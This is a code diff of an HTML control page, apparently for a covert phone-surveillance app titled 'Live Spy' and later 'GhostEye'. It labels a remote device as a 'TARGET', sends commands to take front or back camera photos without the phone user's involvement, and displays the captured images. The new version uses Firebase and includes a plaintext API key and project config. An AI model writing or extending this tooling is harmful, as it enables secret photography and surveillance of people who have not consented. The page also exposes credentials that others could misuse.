@@ -3,260 +3,127 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Spy - Camera Monitor</title>
+    <title>GhostEye Live Camera</title>
+    
+    <script type="module" src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js"></script>
+    <script type="module" src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
     <style>
-        :root {
-            --bg: #050505;
-            --accent: #ff4444;
-            --glass: rgba(255, 255, 255, 0.1);
-            --border: #333;
-        }
-        body { 
-            background: var(--bg); 
-            color: white; 
-            font-family: 'Segoe UI', sans-serif; 
-            margin: 0; 
-            padding: 10px;
-            display: flex;
-            flex-direction: column;
-            height: 100vh;
-            box-sizing: border-box;
-        }
+        body { background-color: #050505; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; height: 100vh; }
+        
+        .header { padding: 15px; background: #111; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
+        .back-btn { color: #ccc; text-decoration: none; font-size: 1.2rem; }
+        .status { font-size: 0.9rem; color: #00ff88; font-weight: bold; }
 
-        .top-nav {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 10px 5px;
-        }
-        .back-btn { 
-            color: #ccc; 
-            text-decoration: none; 
-            font-size: 1.1rem; 
-            display: flex; 
-            align-items: center; 
-            gap: 5px; 
-        }
-        .device-id-display {
-            font-size: 0.9rem;
-            color: #00f3ff;
-            font-family: monospace;
-            font-weight: bold;
-        }
-
-        .monitor { 
-            flex: 1;
-            width: 100%; 
-            background: #000; 
-            margin: 10px 0; 
-            border: 1px solid var(--border); 
-            border-radius: 12px; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            position: relative; 
-            overflow: hidden;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        .cam-container {
+            flex: 1; display: flex; justify-content: center; align-items: center; 
+            background: #000; position: relative; overflow: hidden;
         }
         
-        .status-badge { 
-            position: absolute; 
-            top: 15px; 
-            left: 15px; 
-            background: rgba(255, 0, 0, 0.2); 
-            color: var(--accent);
-            border: 1px solid var(--accent);
-            padding: 4px 8px; 
-            border-radius: 4px; 
-            font-size: 10px; 
-            font-weight: bold;
-            letter-spacing: 1px;
-            z-index: 5;
-            display: flex;
-            align-items: center;
-            gap: 5px;
+        #liveImage { width: 100%; height: 100%; object-fit: contain; display: none; }
+        .placeholder { color: #333; font-size: 1.2rem; text-align: center; }
+
+        .controls {
+            padding: 20px; background: #111; border-top: 1px solid #333;
+            display: flex; justify-content: space-around;
         }
         
-        .blinking-dot {
-            width: 6px;
-            height: 6px;
-            background-color: var(--accent);
-            border-radius: 50%;
-            animation: blink 1s infinite;
+        .btn {
+            background: #222; color: white; border: 1px solid #444; 
+            padding: 15px 25px; border-radius: 10px; cursor: pointer; 
+            font-size: 1rem; display: flex; flex-direction: column; align-items: center; gap: 5px;
+            transition: 0.2s; width: 40%;
         }
+        .btn:active { transform: scale(0.95); background: #00ff88; color: black; }
+        .btn i { font-size: 1.5rem; }
 
-        @keyframes blink { 50% { opacity: 0; } }
-
-        .timestamp {
-            position: absolute;
-            bottom: 10px;
-            right: 15px;
-            color: rgba(255,255,255,0.7);
-            font-size: 10px;
-            font-family: monospace;
-            background: rgba(0,0,0,0.8);
-            padding: 4px 8px;
-            border-radius: 3px;
-            border: 1px solid #444;
-        }
-
-        #placeholderIcon {
-            color: #222;
-            font-size: 3.5rem;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
-
-        #liveImage {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            display: none;
-        }
-
-        .controls-grid { 
-            display: grid; 
-            grid-template-columns: repeat(3, 1fr); 
-            gap: 10px; 
-            padding-bottom: 10px;
-        }
-
-        .btn { 
-            padding: 12px; 
-            border-radius: 8px; 
-            border: 1px solid var(--border); 
-            background: var(--glass); 
-            color: #ddd; 
-            cursor: pointer; 
-            font-size: 11px; 
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
-            transition: all 0.2s ease;
-        }
-        .btn i { font-size: 1.4rem; }
-        .btn:active { transform: scale(0.95); background: #222; }
-        .btn-capture { border-color: #4caf50; color: #4caf50; }
-
+        /* Loader */
+        .loader { display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #00ff88; }
     </style>
 </head>
 <body>
 
-    <div class="top-nav">
-        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Back</a>
-        <span class="device-id-display" id="dispID">ID: LOADING...</span>
+    <div class="header">
+        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
+        <span class="status" id="connStatus">Connecting...</span>
     </div>
-    
-    <div class="monitor">
-        <div class="status-badge" id="liveBadge">
-            <div class="blinking-dot"></div> MONITORING
+
+    <div class="cam-container">
+        <div class="placeholder" id="placeholderMsg">
+            <i class="fa-solid fa-camera fa-3x"></i><br><br>
+            Waiting for Camera...
         </div>
-        
-        <i id="placeholderIcon" class="fa-solid fa-satellite-dish"></i>
-        <img id="liveImage" src="" alt="Live Feed">
-        <div class="timestamp" id="imgTime">WAITING FOR DATA...</div>
+        <div class="loader" id="loader"><i class="fa-solid fa-spinner fa-spin fa-2x"></i></div>
+        <img id="liveImage" src="" alt="Camera Feed">
     </div>
 
-    <div class="controls-grid">
-        <button class="btn btn-capture" onclick="sendCommand('camera_back')">
-            <i class="fa-solid fa-camera"></i> BACK CAM
+    <div class="controls">
+        <button class="btn" onclick="requestPhoto('0')">
+            <i class="fa-solid fa-camera"></i> Back Cam
         </button>
-
-        <button class="btn" onclick="sendCommand('camera_front')">
-            <i class="fa-solid fa-camera-rotate"></i> FRONT CAM
-        </button>
-
-        <button class="btn" onclick="alert('Recording started on phone!')">
-            <i class="fa-solid fa-microphone"></i> REC AUDIO
+        <button class="btn" onclick="requestPhoto('1')">
+            <i class="fa-solid fa-camera-rotate"></i> Front Cam
         </button>
     </div>
 
-    <script>
-        const API_BASE = "https://child-v9no.onrender.com";
-        
-        // 1. ID Fetching Logic (Sync with Dashboard)
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+        // ✅ Firebase Config (Tumhari wali)
+        const firebaseConfig = {
+            apiKey: "AIzaSyDs5ubX4MGyVoCHIJXXgWBpU7wgoS5jcDM",
+            authDomain: "childapp-ce1fe.firebaseapp.com",
+            databaseURL: "https://childapp-ce1fe-default-rtdb.firebaseio.com",
+            projectId: "childapp-ce1fe",
+            storageBucket: "childapp-ce1fe.firebasestorage.app",
+            messagingSenderId: "108035285372",
+            appId: "1:108035285372:web:generated_placeholder"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Get ID from URL or Storage
         const urlParams = new URLSearchParams(window.location.search);
-        let deviceId = urlParams.get('id') || localStorage.getItem('monitoring_id');
-
-        if(deviceId) {
-            deviceId = deviceId.toUpperCase().trim();
-            document.getElementById('dispID').innerText = "TARGET: " + deviceId;
-            localStorage.setItem('monitoring_id', deviceId);
-        } else {
-            alert("No Device ID Found!");
-            window.location.href = "index.html";
+        let deviceId = urlParams.get('id') || localStorage.getItem('ghost_device_id');
+        
+        if(!deviceId) {
+            alert("No Device ID selected!");
+            window.location.href = 'index.html';
         }
 
-        // 2. Command Send Function
-        async function sendCommand(cmd) {
-            const btn = event.currentTarget;
-            const originalText = btn.innerHTML;
-            btn.style.opacity = "0.5";
-            btn.innerText = "SENDING...";
+        document.getElementById('connStatus').innerText = "Target: " + deviceId;
 
-            try {
-                await fetch(`${API_BASE}/api/send-command`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ device_id: deviceId, command: cmd })
-                });
-            } catch (error) {
-                console.error("Command Error:", error);
+        // 🔥 LISTEN FOR PHOTO UPDATES
+        const imgRef = ref(db, 'live_cameras/' + deviceId + '/image');
+        
+        onValue(imgRef, (snapshot) => {
+            const base64 = snapshot.val();
+            if(base64) {
+                const imgTag = document.getElementById('liveImage');
+                imgTag.src = "data:image/jpeg;base64," + base64;
+                imgTag.style.display = "block";
+                document.getElementById('placeholderMsg').style.display = "none";
+                document.getElementById('loader').style.display = "none";
             }
+        });
 
-            setTimeout(() => {
-                btn.style.opacity = "1";
-                btn.innerHTML = originalText;
-            }, 1500);
+        // 🔥 SEND COMMAND FUNCTION
+        window.requestPhoto = function(camType) {
+            console.log("Requesting Camera: " + camType);
+            
+            // UI Feedback
+            document.getElementById('loader').style.display = "block";
+            
+            // Send Command to Firebase
+            // App me listener lagana padega "live_cameras/ID/command" par
+            set(ref(db, 'live_cameras/' + deviceId + '/command'), {
+                action: camType === '1' ? 'capture_front' : 'capture_back',
+                timestamp: Date.now()
+            });
         }
-
-        // 3. Fetch Latest Photo Logic
-        let lastTimestamp = 0;
-
-        async function fetchPhoto() {
-            try {
-                // Server se gallery data fetch karo
-                const response = await fetch(`${API_BASE}/api/get-data/${deviceId}/gallery`);
-                if (!response.ok) return;
-
-                const data = await response.json();
-                
-                // Agar data array hai aur usme photos hain
-                if (Array.isArray(data) && data.length > 0) {
-                    const latest = data[0]; // Server unshift karta hai, toh 0 par latest hogi
-
-                    // Check karein ki kya ye nayi photo hai
-                    if (latest.uploadedAt > lastTimestamp) {
-                        lastTimestamp = latest.uploadedAt;
-                        
-                        const imgElement = document.getElementById('liveImage');
-                        const placeholder = document.getElementById('placeholderIcon');
-                        const timeLabel = document.getElementById('imgTime');
-
-                        // Image display
-                        let src = latest.image.startsWith('data') ? latest.image : `data:image/jpeg;base64,${latest.image}`;
-                        imgElement.src = src;
-                        
-                        imgElement.style.display = "block";
-                        placeholder.style.display = "none";
-                        timeLabel.innerText = "CAPTURED: " + latest.time;
-                        
-                        // Flash effect for new image
-                        document.getElementById('liveBadge').style.background = "#4caf50";
-                        setTimeout(() => { document.getElementById('liveBadge').style.background = "rgba(255,0,0,0.2)"; }, 1000);
-                    }
-                }
-            } catch (err) {
-                console.log("Checking server...");
-            }
-        }
-
-        // Loop: Har 3 second mein nayi photo check karo
-        setInterval(fetchPhoto, 3000);
-        window.onload = fetchPhoto;
-
     </script>
 </body>
 </html>
